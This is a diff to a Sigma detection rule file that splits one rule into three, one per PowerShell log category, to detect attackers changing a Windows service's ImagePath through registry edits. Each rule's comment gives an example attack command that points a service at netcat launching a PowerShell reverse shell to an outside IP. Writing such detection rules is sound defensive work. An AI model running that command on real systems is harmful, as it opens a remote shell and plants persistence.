@@ -1,4 +1,5 @@
-title: Service abuse with malicious ImagePath (Reg via PowerShell)
+title: Service abuse with malicious ImagePath (Reg via PowerShell) - ps_module
+id: 5dfe3be2-e251-4a81-8d14-7b057bb5faca
 description: Detects scenarios where an attacker modify the original service executable path with a malicious one.
 references:
 - https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack/tree/master/TA0003-Persistence/T1543.003-Create%20or%20Modify%20System%20Process-Windows%20Service
@@ -12,10 +13,40 @@ author: mdecrevoisier
 status: experimental
 logsource:
   product: windows
-  category:
-    - ps_module
-    - ps_classic_script
-    - ps_script
+  category: ps_module
+detection: # Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name ImagePath -value "C:\nc.exe -e powershell.exe 10.10.14.26 4447"
+  selection_powershell_modern:
+    EventID: 4103
+    Payload|contains|all:
+      - '-ItemProperty' # Can be New-* or Set-*
+      - '\SYSTEM\CurrentControlSet\Services\'
+      - ImagePath
+
+  condition: 1 of selection*
+falsepositives:
+- administrator reconfiguring service
+level: high
+
+---
+title: Service abuse with malicious ImagePath (Reg via PowerShell) - ps_classic_script
+id: 19e153ea-9a90-4972-bf9f-afadeffe8505
+related:
+  - id: 5dfe3be2-e251-4a81-8d14-7b057bb5faca
+    type: similar
+description: Detects scenarios where an attacker modify the original service executable path with a malicious one.
+references:
+- https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack/tree/master/TA0003-Persistence/T1543.003-Create%20or%20Modify%20System%20Process-Windows%20Service
+- https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc742019(v=ws.11)
+- https://pentestlab.blog/2020/01/22/persistence-modify-existing-service/
+- https://medium.com/r3d-buck3t/abuse-service-registry-acls-windows-privesc-f88079140509
+tags:
+- attack.persistence
+- attack.t1543.003
+author: mdecrevoisier
+status: experimental
+logsource:
+  product: windows
+  category: ps_classic_script
 detection: # Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name ImagePath -value "C:\nc.exe -e powershell.exe 10.10.14.26 4447"
   selection_powershell_native:
     EventID: 800
@@ -24,13 +55,32 @@ detection: # Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xbox
       - '\SYSTEM\CurrentControlSet\Services\'
       - ImagePath
 
-  selection_powershell_modern:
-    EventID: 4103
-    Payload|contains|all:
-      - '-ItemProperty' # Can be New-* or Set-*
-      - '\SYSTEM\CurrentControlSet\Services\'
-      - ImagePath
+  condition: 1 of selection*
+falsepositives:
+- administrator reconfiguring service
+level: high
 
+---
+title: Service abuse with malicious ImagePath (Reg via PowerShell) - ps_script
+id: 7b9c3fa9-de9b-4b31-9712-2f188cc77cc5
+related:
+  - id: 5dfe3be2-e251-4a81-8d14-7b057bb5faca
+    type: similar
+description: Detects scenarios where an attacker modify the original service executable path with a malicious one.
+references:
+- https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack/tree/master/TA0003-Persistence/T1543.003-Create%20or%20Modify%20System%20Process-Windows%20Service
+- https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc742019(v=ws.11)
+- https://pentestlab.blog/2020/01/22/persistence-modify-existing-service/
+- https://medium.com/r3d-buck3t/abuse-service-registry-acls-windows-privesc-f88079140509
+tags:
+- attack.persistence
+- attack.t1543.003
+author: mdecrevoisier
+status: experimental
+logsource:
+  product: windows
+  category: ps_script
+detection: # Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name ImagePath -value "C:\nc.exe -e powershell.exe 10.10.14.26 4447"
   selection_powershell_block:
     EventID: 4104
     ScriptBlockText|contains|all:
